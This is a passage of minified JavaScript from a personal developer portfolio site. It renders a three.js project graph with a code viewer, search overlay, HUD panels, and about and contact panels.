e["class-name"],i.languages.typescript["class-name"].inside=e,i.languages.insertBefore("typescript","function",{decorator:{pattern:/@[$\w\xA0-\uFFFF]+/,inside:{at:{pattern:/^@/,alias:"operator"},function:/^[\s\S]+/}},"generic-function":{pattern:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>(?=\s*\()/,greedy:!0,inside:{function:/^#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*/,generic:{pattern:/<[\s\S]+/,alias:"class-name",inside:e}}}}),i.languages.ts=i.languages.typescript})(Prism);const em={cpp:"cpp",c:"c",csharp:"csharp",python:"python",typescript:"typescript",php:"php"};function tm(i){const e=document.createElement("div");e.className="codepanel",i.appendChild(e);const t={openPinId:null,activeTabIdx:0,tabs:[]},n=()=>{const r=t.tabs[t.activeTabIdx];if(!r){e.innerHTML="";return}const s=bn.find(p=>p.id===r.projectId),o=Wh(r.file)??"// snippet not yet vendored",a=em[r.lang]??"plain",l=qr.languages[a]??qr.languages.markup,h=qr.highlight(o,l,a).split(`
`).map((p,m)=>`<span class="ln">${m+1}</span>${p}`).join(`
`);e.innerHTML=`
      <div class="tabs">
        ${t.tabs.map((p,m)=>`<span class="tab ${m===t.activeTabIdx?"active":""}" data-idx="${m}">${di(p.file)}</span>`).join("")}
      </div>
      <div class="head">
        <span>// ${di(s?.name??"")} › ${di(r.file)}</span>
        <span>L ${r.lineStart} — ${r.lineEnd}</span>
      </div>
      <pre><code>${h}</code></pre>
      <div class="footer">
        <span>${di(r.caption)}</span>
        <span>${s?.githubUrl?`<a href="${s.githubUrl}" target="_blank" rel="noopener">${di(s.githubUrl.replace(/^https?:\/\//,""))} ↗</a>`:""}</span>
      </div>
    `,e.querySelectorAll(".tab").forEach(p=>{p.addEventListener("click",()=>{const m=Number(p.dataset.idx);t.activeTabIdx=m,n()})})};return{open(r){const s=sr.filter(o=>o.projectId===r.projectId);t.tabs=s,t.activeTabIdx=Math.max(0,s.findIndex(o=>o.id===r.id)),t.openPinId=r.id,e.classList.add("open"),n()},close(){t.openPinId=null,e.classList.remove("open")},isOpen:()=>t.openPinId!==null}}function di(i){return i.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")}function nm(i,e,t,n){const r=new Set;bn.forEach(m=>m.lang.forEach(E=>r.add(E)));const s=Array.from(r).map(m=>m.toUpperCase()).join(" · "),o=(t.length*2/e.nodes.length).toFixed(2),a=document.createElement("div");a.className="hud tl",a.innerHTML=`
    <div class="name">ERIC&nbsp;MEIGGS</div>
    <div class="handle">// 0xE666 &nbsp;·&nbsp; full-stack engineer</div>
    <div class="instrument">
      <div class="row"><span class="key">PROJECTS</span><span>${bn.length} KNOTS</span></div>
      <div class="row"><span class="key">NODES</span><span>${e.nodes.length}</span></div>
      <div class="row"><span class="key">EDGES</span><span>${t.length}</span></div>
      <div class="row"><span class="key">PINPOINTS</span><span>${sr.length}</span></div>
      <div class="row"><span class="key">AVG&nbsp;DEG</span><span>${o}</span></div>
      <div class="row"><span class="key">LANG</span><span>${s}</span></div>
      <div class="row"><span class="key">STATUS</span><span>● ONLINE</span></div>
    </div>
  `,i.appendChild(a);const l=document.createElement("div");l.className="hud tr";const u=[...bn].filter(m=>m.tier<=4).sort((m,E)=>m.tier-E.tier||E.nodeCount-m.nodeCount).slice(0,8).map(m=>{const E=Math.round(m.nodeCount/140*10),x="▰".repeat(E),f="▱".repeat(10-E);return`<div>${m.name.padEnd(22," ")} ${x}${f} ${String(m.nodeCount).padStart(3," ")}</div>`}).join(`
`);l.innerHTML=`
    <nav>
      <b id="nav-works">WORKS</b> &nbsp;
      <span id="nav-about">ABOUT</span> &nbsp;
      <span id="nav-contact">CONTACT</span>
    </nav>
    <div class="sort">SORT <u>COMPLEXITY ▾</u></div>
    <div class="stats">
      <div style="opacity:0.55; letter-spacing:0.18em; margin-bottom:4px;">// CLUSTERS</div>
      <pre style="margin:0; font-family:inherit; font-size:8.5px; line-height:1.55;">${u}</pre>
    </div>
  `,i.appendChild(l);const h=document.createElement("div");h.className="hud bl",h.innerHTML="[DRAG] rotate &nbsp;·&nbsp; [SCROLL] zoom &nbsp;·&nbsp; [HOVER PIN] inspect &nbsp;·&nbsp; [/] search &nbsp;·&nbsp; [ESC] close",i.appendChild(h);const p=document.createElement("div");p.className="hud br",p.innerHTML=`
    v0.1.0 &nbsp;·&nbsp; build production · three.js
    <br />
    <span style="opacity:0.4">meiggs.dev &nbsp;·&nbsp; github.com/0xE666</span>
  `,i.appendChild(p),document.getElementById("nav-about")?.addEventListener("click",n.openAbout),document.getElementById("nav-contact")?.addEventListener("click",n.openContact)}function im(i){const e=document.createElement("div");e.className="slidepanel about",e.innerHTML=`
    <span class="close" data-close>×</span>
    <h3>// ABOUT</h3>
    <p>Full-stack engineer. I build at the seams &mdash; APIs that shouldn't exist (iOS reverse-engineering for Soundmap-API), agents that route across local + cloud LLMs (vaal), and Windows internals tooling for security research.</p>
    <p>Comfortable from PHP at the surface to PE/IAT walks in C++ at the bottom. Most of my public work is on GitHub as <a href="https://github.com/0xE666" target="_blank" rel="noopener">0xE666</a>.</p>
    <p style="opacity:0.55; font-size:11px; margin-top:32px;">
      Tier-1 work shown on the bridge: <strong>vaal</strong>, <strong>Windows-Internals research</strong>.
      Tier-2: <strong>Soundmap-API</strong>, <strong>poe_null</strong>, <strong>poe-trade-api</strong>, <strong>poe-watcher</strong>.
    </p>
  `,i.appendChild(e),e.querySelector("[data-close]")?.addEventListener("click",()=>e.classList.remove("open"));let t=!1;return{open(){t=!0,e.classList.add("open")},close(){t=!1,e.classList.remove("open")},isOpen:()=>t}}function rm(i){const e=document.createElement("div");e.className="slidepanel contact",e.innerHTML=`
    <span class="close" data-close>×</span>
    <h3>// CONTACT</h3>
    <ul style="list-style:none; padding:0; margin:0; line-height:2;">
      <li>email &nbsp;&nbsp;&nbsp;<a href="mailto:ericflipreset@gmail.com">ericflipreset@gmail.com</a></li>
      <li>discord &nbsp;<span style="color:var(--fg);">eric.cpp</span></li>
    </ul>
    <p style="opacity:0.45; font-size:11px; margin-top:24px;">
      Open to: full-stack roles, security-research, AI agent / tooling work, contract.
    </p>
  `,i.appendChild(e),e.querySelector("[data-close]")?.addEventListener("click",()=>e.classList.remove("open"));let t=!1;return{open(){t=!0,e.classList.add("open")},close(){t=!1,e.classList.remove("open")},isOpen:()=>t}}function sm(i,e){const t=document.createElement("div");t.className="search-overlay",t.innerHTML=`
    <input type="text" placeholder="search projects, pins, files…" />
    <div class="results"></div>
  `,i.appendChild(t);const n=t.querySelector("input"),r=t.querySelector(".results");let s=0,o=[],a=!1;const l=[...bn.map(p=>({type:"project",id:p.id,label:`${p.name}  //  T${p.tier}  ${p.lang.join(" ")}`})),...sr.map(p=>({type:"pin",id:p.id,label:`${p.file}:${p.lineStart}  //  ${p.label}`,pin:p}))],d=()=>{if(!o.length){r.innerHTML='<div class="result" style="opacity:0.4">no matches</div>';return}r.innerHTML=o.map((p,m)=>`<div class="result ${m===s?"active":""}" data-idx="${m}">${am(p.label)}</div>`).join(""),r.querySelectorAll(".result").forEach(p=>{p.addEventListener("click",()=>{s=Number(p.dataset.idx),u()})})},u=()=>{const p=o[s];p&&(p.type==="pin"&&p.pin&&e.open(p.pin),h.close())};n.addEventListener("input",()=>{const p=n.value.trim().toLowerCase();o=p?l.filter(m=>m.label.toLowerCase().includes(p)):l.slice(0,30),s=0,d()}),n.addEventListener("keydown",p=>{p.key==="ArrowDown"?(s=Math.min(o.length-1,s+1),d(),p.preventDefault()):p.key==="ArrowUp"?(s=Math.max(0,s-1),d(),p.preventDefault()):p.key==="Enter"?u():p.key==="Escape"&&h.close()});const h={toggle(){a?h.close():(a=!0,t.classList.add("open"),n.value="",o=l.slice(0,30),s=0,d(),n.focus())},close(){a=!1,t.classList.remove("open")},isOpen:()=>a};return h}function am(i){return i.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}const Ja=2654435761;function om(){if((navigator.deviceMemory??8)<4)return!0;try{const e=document.createElement("canvas"),t=e.getContext("webgl2")||e.getContext("webgl");if(!t)return!1;if(t.getParameter(t.MAX_VERTEX_UNIFORM_VECTORS)<256)return!0}catch{}return!1}function lm(){try{const i=document.createElement("canvas");return!!(i.getContext("webgl2")||i.getContext("webgl"))}catch{return!1}}function cm(){document.getElementById("bridge-canvas")?.remove(),document.getElementById("hud-root")?.remove();const i=document.getElementById("fallback");i.style.display="block";const e=document.getElementById("fallback-table");e.innerHTML=`
    <thead><tr><th>Tier</th><th>Project</th><th>Lang</th><th>Description</th></tr></thead>
    <tbody>${bn.map(t=>`
      <tr>
        <td>T${t.tier}</td>
        <td>${t.githubUrl?`<a href="${t.githubUrl}">${t.name}</a>`:t.name}</td>
        <td>${t.lang.join(", ")}</td>
        <td>${t.blurb}</td>
      </tr>`).join("")}
    </tbody>
  `}function dm(){const i=document.getElementById("bridge-canvas");if(!i)throw new Error("canvas missing");const e=new Io({canvas:i,antialias:!0,alpha:!1});e.setPixelRatio(Math.min(2,window.devicePixelRatio)),e.setClearColor(0,1);const t=new $f,n=Jf();n.attach(i);const r=()=>{const T=window.innerWidth,D=window.innerHeight;e.setSize(T,D,!1),n.camera.aspect=T/D,n.camera.updateProjectionMatrix()};window.addEventListener("resize",r),r();const s=om(),o=rh(bn,Ja,s?.5:1);window.__BRIDGE__=o;const a=lh(o.knots);t.add(a.group);const l=uh(o,Ja),d=ph(o,l);t.add(d.group);const u=Kh(o);t.add(u.pinHalos,u.pinRings,u.pinDots),window.__PINS__=u;const h=document.getElementById("codepanel-root"),p=tm(h),m=document.getElementById("overlay-root"),E=im(m),x=rm(m),f=sm(m,p),c=document.getElementById("hud-root");nm(c,o,l,{openAbout:()=>E.open(),openContact:()=>x.open()});const g=document.createElement("div");g.className="pin-tooltip",document.body.appendChild(g);let _=null;Zh(i,n.camera,u,T=>{if(_=T.index,T.pin){i.style.cursor="pointer",g.textContent=`${T.pin.label}  ·  ${T.pin.file}:${T.pin.lineStart}`,g.classList.add("visible");const D=Math.min(window.innerWidth-240,T.clientX+14),y=Math.max(8,T.clientY-28);g.style.left=`${D}px`,g.style.top=`${y}px`}else i.style.cursor="",g.classList.remove("visible")}),i.addEventListener("click",T=>{const D=i.getBoundingClientRect(),y=new Be((T.clientX-D.left)/D.width*2-1,-((T.clientY-D.top)/D.height)*2+1),R=new Lo;R.setFromCamera(y,n.camera);const k=R.intersectObject(u.pinDots,!1);if(k.length){const X=k[0].instanceId,te=u.pinAnchors[X];te&&(p.open(te),g.classList.remove("visible"))}else p.isOpen()&&p.close()}),window.addEventListener("keydown",T=>{T.key==="/"&&!(T.target instanceof HTMLInputElement)&&(T.preventDefault(),f.toggle()),T.key==="Escape"&&(f.isOpen()?f.close():p.isOpen()?p.close():E.isOpen()?E.close():x.isOpen()&&x.close())});let v=performance.now();const w=v;function M(){const T=performance.now(),D=(T-v)/1e3;v=T;const y=(T-w)/1e3;n.update(D),ch(a.spins,D),$h(u,y,_),e.render(t,n.camera),requestAnimationFrame(M)}M(),console.log(`bridge: ${o.knots.length} knots, ${o.nodes.length} nodes, ${l.length} edges, ${u.pinAnchors.length} pins`)}lm()?dm():cm();
